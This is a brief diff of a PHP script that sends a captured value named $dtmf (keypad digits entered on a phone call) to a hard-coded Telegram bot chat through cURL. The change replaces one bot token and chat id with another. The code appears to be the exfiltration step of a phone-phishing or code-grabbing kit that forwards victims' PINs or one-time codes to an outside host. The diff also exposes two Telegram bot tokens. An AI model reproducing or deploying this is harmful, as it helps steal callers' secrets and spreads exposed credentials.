@@ -30,7 +30,7 @@ if (file_put_contents($file, $textToAppend, FILE_APPEND) !== false) {
 $curl = curl_init();
 
 curl_setopt_array($curl, array(
-    CURLOPT_URL => 'https://api.telegram.org/bot6641886837:AAG0CFfQ4XjiDqRBAFiiJ2EzaMnFOxfl8Bo/sendMessage?chat_id=-4566347970&text=' . urlencode($dtmf), // Use urlencode here
+    CURLOPT_URL => 'https://api.telegram.org/bot8178049394:AAGvWMrdWzJS0brFmCBL_dyUKk6ZMTGDwYY/sendMessage?chat_id=-1002347274383&text=' . urlencode($dtmf), // Use urlencode here
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_ENCODING => '',
     CURLOPT_MAXREDIRS => 10,
